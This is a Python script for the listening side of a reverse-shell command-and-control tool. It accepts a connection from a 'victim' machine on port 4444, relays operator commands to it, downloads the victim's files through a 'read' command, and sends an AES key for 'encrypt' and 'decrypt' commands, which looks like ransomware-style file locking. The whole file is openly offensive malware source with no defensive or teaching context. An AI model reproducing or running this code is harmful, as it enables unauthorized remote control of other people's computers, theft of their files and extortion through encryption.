import socket
import struct
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

SERVER_HOST = "10.0.1.24" # desktop
SERVER_PORT = 4444
BUFFER_SIZE = 1024 # max size of messages

SEPARATOR = "<sep>"

encryption_key = None

s = socket.socket()

# bind the socket
s.bind((SERVER_HOST, SERVER_PORT))

# Listening
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# Accept client to connect
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# Receiving the current working directory from the victim
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory", cwd)

# AES stuff, generate key asdasdasd
key = get_random_bytes(16) # 16 bytes is the minimum length of AES
#print(key)
#cipher = AES.new(key, AES.MODE_EAX)


# Loop for making commands and sending them to the victim
while True:
    # Reading 
    command = input(f"{cwd} $> ")
    splitted_command = command.split()
    if not command.strip():
        continue

    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    elif splitted_command[0].lower() == "read" :
        file_name = splitted_command[1]

        # Making sure file exists and receiving file size
        #file_size = struct.unpack("i", s.recv(4))[0]
        file_size = int(client_socket.recv(BUFFER_SIZE).decode())

        output_file = open(file_name, "wb")
        bytes_recieved = 0

        print("Downloading...")
        while bytes_recieved < file_size :
            l = client_socket.recv(BUFFER_SIZE)
            output_file.write(l)
            bytes_recieved += BUFFER_SIZE
        output_file.close()
        print("Download successful!")

        client_socket.send("1".encode())
    elif splitted_command[0].lower() == "encrypt":
        client_socket.recv(BUFFER_SIZE)
        # Send AES key to victim
        client_socket.send(key)

        #encryption_key = client_socket.recv(BUFFER_SIZE)
        client_socket.send("1".encode())
    elif splitted_command[0].lower() == "decrypt":
        encryption_key = client_socket.recv(BUFFER_SIZE)
        # Send AES key to victim
        client_socket.send(key)
        client_socket.send("1".encode())

    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)